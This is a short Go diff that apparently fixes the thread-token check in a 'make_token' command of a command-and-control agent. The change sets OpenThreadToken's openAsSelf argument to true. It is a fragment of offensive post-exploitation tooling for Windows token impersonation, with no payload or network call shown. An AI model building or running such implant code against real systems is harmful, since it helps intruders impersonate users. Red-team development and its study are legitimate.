@@ -175,9 +175,9 @@ func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
 	// Keep the token handle open - needed for impersonation to remain valid
 	// Will be cleaned up on rev2self or process exit
 
-	// Verify impersonation by checking thread token
+	// Verify impersonation by checking thread token (openAsSelf=true to check from process context)
 	var hThreadToken windows.Token
-	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, false, &hThreadToken)
+	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, true, &hThreadToken)
 	if err == nil {
 		defer hThreadToken.Close()
 		threadTokenUser, err := hThreadToken.GetTokenUser()
